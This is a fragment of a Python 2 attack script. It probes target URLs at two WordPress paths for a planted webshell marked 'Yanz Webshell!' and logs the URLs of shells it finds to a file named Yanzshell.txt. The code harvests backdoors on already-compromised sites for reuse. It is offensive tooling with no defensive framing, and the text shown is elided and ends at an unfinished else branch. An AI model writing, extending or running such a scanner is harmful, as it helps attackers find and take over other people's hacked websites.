...
def FourHundredThree(url):
    try:
        ...
        check = requests.get(url+'/wp-includes/themes.php',headers=headers, allow_redirects=True,timeout=15)
        if 'Yanz Webshell!' in check.content:
                print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                open('Yanzshell.txt', 'a').write(url + '/wp-includes/themes.php\n')
        else:
            url = 'https://' + URLdomain(url)
            check = requests.get(url+'/wp-admin/css/index.php',headers=headers, allow_redirects=True,verify=False ,timeout=15)
            if 'Yanz Webshell!' in check.content:
                    print ' -| ' + url + ' --> {}[Succefully]'.format(fg)
                    open('Yanzshell.txt', 'a').write(url + '/wp-admin/css/index.php\n')
            else:
